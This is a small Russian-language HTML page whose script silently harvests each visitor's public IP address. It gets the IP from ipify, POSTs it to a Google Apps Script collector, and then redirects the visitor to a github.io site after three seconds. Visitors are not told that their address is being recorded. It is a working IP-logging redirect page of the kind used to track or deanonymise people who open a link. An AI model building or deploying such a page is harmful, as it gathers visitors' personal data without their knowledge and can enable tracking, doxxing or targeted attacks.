<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch and Redirect</title>
</head>
<body>
    <h1>Отправка запроса и переход на другой сайт</h1>
    <pre id="response"></pre>

    <script>
        // Функция для получения настоящего IP-адреса
        function getIpAddress() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Ошибка при получении IP:', error);
                    return null;
                });
        }

        // Функция для отправки запроса с IP-адресом
        function sendRequest(ip) {
            fetch('https://script.google.com/macros/s/AKfycbx6o0MWIuwOvpbE6mrPTbb2PYkjcj53XklHGPYM3Qbm6KUcnO6s-2eWBZQoZUSr3N0/exec', {
                method: 'POST',
                body: JSON.stringify({ ip: ip }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                document.getElementById("response").textContent = JSON.stringify(data, null, 2);
            })
            .catch(error => console.error('Ошибка:', error));
        }

        // Получение IP-адреса и отправка запроса
        getIpAddress().then(ip => {
            if (ip) {
                sendRequest(ip);
            } else {
                document.getElementById("response").textContent = "Не удалось получить IP-адрес.";
            }
        });

        // Переход на другой сайт через 3 секунды
        setTimeout(() => {
            window.location.href = 'https://xuilan.github.io/work/';
        }, 3000); // 3000 миллисекунд (3 секунды)
    </script>
</body>
</html>
